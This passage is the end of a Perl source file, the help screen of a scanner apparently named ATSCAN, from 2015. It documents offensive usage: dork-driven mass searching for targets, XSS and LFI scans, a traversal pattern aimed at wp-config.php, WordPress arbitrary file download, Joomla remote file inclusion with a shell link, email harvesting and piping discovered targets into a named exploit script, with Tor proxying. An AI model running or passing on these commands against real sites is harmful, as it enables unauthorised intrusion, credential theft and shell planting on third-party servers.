  ."                 | site.com/index.php?id=1->9 \n"
  ."  repeat(txt-y)  | EX: --exp \"/index.php?id=repeat(../-9)wp-config.php\" --xss OR -t \"site.com/index.php?id=../wp-config.php\"\n"
  ."                 | In site.com/index.php?id=../wp-config.php then site.com/index.php?id=../../wp-config.php 9 times\n"
  ."  [DATA]         | To separate data values ex: --data \"name:username [DATA]email:xxxxxx [DATA]pass:xxxxx\"\n"
  ."  [OTHER]        | To separate all others values (dork exploit payload proxy target..) ex: --dork \"dork1 [OTHER]DORK2 [OTHER]DORK3\"\n"
  ."  --pass         | Set or edit tool password. \n"  
  ."  --update       | Update tool. \n"  
  ."  --uninstall    | Uninstall tool \n\n";
  
  ltak(); print $c[11]." [::] EXAMPLES: \n";
  
  ltak(); print $c[12]."  PROXY: \n".$c[10]
  ."   Tor: --proxy socks://localhost:9050 \n"
  ."   Proxy: --proxy <proxy> [Ex: http://12.32.1.5:8080] | --proxy <list.txt>.\n".$c[10]."\n\n";
  ltak(); print $c[12]."  RANDOM: \n".$c[10]
  ."   Random proxy: --proxy-random [proxy | list.txt] \n"
  ."   Random agent: --b-random \n"
  ."   Random engine: --m-random \n\n" ;
  ltak(); print $c[12]."  SEARCH ENGINE: \n".$c[10]
  ."   Search: atscan --dork <dork> --level <level> \n"
  ."   Search: atscan -d <dork> -l <level> \n"
  ."   Set engine: atscan --dork <dork> --level <level> -m [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all]\n"
  ."   Set selective engines: atscan -d <dork> -l <level> -m 1,2,3..\n"
  ."   Search with many dorks: atscan --dork <dork1 [OTHER]dork2 [OTHER]dork3> --level <level> \n"  
  ."   Search and rand: atscan -d <dork> -l <level> --exp \"/index.php?id=rang(1-9)\" --xss\n"  
  ."   Get Server sites: atscan -t <ip> --level <value> --sites\n"
  ."   Get Server wordpress sites: atscan -t <ip> --level <value> --wp \n"
  ."   Get Server joomla sites: atscan -t <ipbgn-ipend> --level <value> --joom \n"
  ."   Get Server upload sites: atscan -t <ip> --level <value> --upload \n"
  ."   Get Server zip sites files: atscan -t <ip> --level <value> --zip \n"
  ."   WP Arbitry File Download: atscan -t <ip> --level <value> --wpafd \n"
  ."   Joomla RFI: atscan -t <ip> --level <10> --joomfri --shell <shell link>\n"
  ."   Search + output: atscan --dork <dorks.txt> --level <level> --save\n\n"
  ."   Search + get emails: atscan -d <dorks.txt> -l <level> --email \n"
  ."   Search + get site emails: atscan --dork <site:site.com> --level <level> --email \n"
  ."   Specify emails: atscan -d <dorks.txt> -l <level> --email -v \"\@gmail | \@yahoo ..\"\n"
  ."   Search + get ips: atscan --dork <dork> --level <level> --ip \n\n";
  
  ltak(); print $c[12]."  REGULAR EXPRESSIONS: \n".$c[10]
  ."   Regex use: atscan [--dork <dork> | -t <target>] --level <level> --regex <regex>\n"
  ."   IP: ((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){ 3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))\n"
  ."   E-mails: ".'((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})'."\n\n";
  
  ltak(); print $c[12]."  REPEATER: \n".$c[10]
  ."   atscan -t \"site.com?index.php?id=rang(1-10)\" --xss\n"
  ."   atscan -t <target> --exp \"/index.php?id=rang(1-10)\" --xss\n"
  ."   atscan -t <target> --exp \"/index.php?id=repeat(../-9)wp-config.php\" \n\n";
  
  ltak(); print $c[12]."  PORTS: \n".$c[10]
  ."   atscan -t <ip> --port <port> [--udp | --tcp] \n"
  ."   atscan -t \(ip start\)-\(ip end\) --port <port> [--udp | --tcp] \n"
  ."   atscan -t <ip> --port \(port start\)-\(port end\) [--udp | --tcp] --command \"your extern command\"\n\n";
  
  ltak(); print $c[12]."  ENCODE / DECODE: \n".$c[10]
  ."   Generate MD5: --md5 <string> \n"
  ."   Encode base64: --encode64 <string>  \n"
  ."   Decode base64: --decode64 <string> \n\n";
  ltak(); print $c[12]."  POST/GET DATA: \n".$c[10]
  ."  Post data: atscan -t <target> --data \"field1:value1[DATA]field2:value2[DATA]field3:value3\" --post | --get\n"
  ."             atscan -t <target> --data \"name:userfile[DATA]value:file.txt --post | --get\n"
  ."  Use list:  atscan -t <target> --data \"/Desktop/list.txt --post | --get\n"
  ."  Post + Validation: --data \"name:userfile[DATA]value:file.txt\" -v <string> | --status <code> --post | --get\n\n";
  
  ltak(); print $c[12]."  EXTERNAL COMMANDES: \n".$c[10]
  ."   atscan --dork <dork | dorks.txt> --level <level> --command \"curl -v --TARGET\" \n"
  ."   atscan --dork <dork | dorks.txt> --level <level> --command \"curl -v --HOST\" \n"
  ."   atscan --dork <dork | dorks.txt> --level <level> --command \"nmap sV -p 21,22,80 --HOSTIP\" \n"
  ."   atscan -t <target> --port 80 --udp --command \"nmap sV -p --PORT --TARGET\" \n" 
  ."   atscan -d \"index of /lib/scripts/dl-skin.php\" -l 20 -m 2 --command \"php WP-dl-skin.php-exploit.php --TARGET\" \n\n";
  
  ltak(); print $c[12]."  MULTIPLE SCANS: \n".$c[10]
  ."   atscan --dork <dork> --level <10> --xss --lfi --wp ..\n"
  ."   atscan --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> [--xss | --lfi | --wp |...]\n"
  ."   atscan -t <ip> --level <10> [--xss | --lfi | --wp |...]\n"
  ."   atscan -t <targets> [--xss | --lfi | --wp |...]\n\n";
  
  ltak(); print $c[12]."  PAYLOADS USE: \n".$c[10]
  ."   atscan --dork <dork> --level <10> [--lfi | --xss ..] --payload <payload | payloads.txt> \n\n";
  
  ltak(); print $c[12]."  SEARCH VALIDATION: \n".$c[10]
  ."   atscan -d <dork | dorks.txt> -l <level> --status <code> | --valid <string> \n"
  ."   atscan -d <dork | dorks.txt> -l <level> --ifinurl <string> \n"
  ."   atscan -d <dork | dorks.txt> -l <level> --regex <regex> --valid <string>\n"
  ."   atscan -d <dork | dorks.txt> -l <level> --unique \n\n";
  
  ltak(); print $c[12]."  SCAN VALIDATION: \n".$c[10]
  ."   atscan -t <target | targets.txt> [--status <code> | --valid <string>] \n"
  ."   atscan -d <dork | dorks.txt> -l <level> --exp <payload> --status <code> | --valid <string> \n"
  ."   atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --status <code> | --valid <string> \n"
  ."   atscan -d <dork | dorks.txt> -l <level> [--admin | --xss ..] --status <code> | --valid <string> \n"  
  ."   atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --status <code> | --valid <string>\n"
  ."   atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --full --status <code> | --valid <string>\n"
  ."   atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --exp <payload> --status <code> | --valid <string>\n"
  ."   atscan --data \"name:userfile[DATA]value:file.txt\" --post -v <string> | --status <code> \n"
  ."   atscan -d <dork | dorks.txt> -l <level> [--xss | --shost ..] --status <code> | --valid <string> \n\n";
  
  ltak(); print $c[12]."  UPDATE TOOL: \n".$c[10]."   --update\n";
  
  ltak(); print $c[12]."  UNINSTALL TOOL: \n".$c[10]."   atscan --uninstall\n";
  ltak(); ltak();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## END HELP ##########################################################################################################################################################################################
## EXIT     ##########################################################################################################################################################################################
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## EXIT
logoff();
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## FIN ###############################################################################################################################################################################################
######################################################################################################################################################################################################
## Copy@right Alisam Technology Team
## 2015  
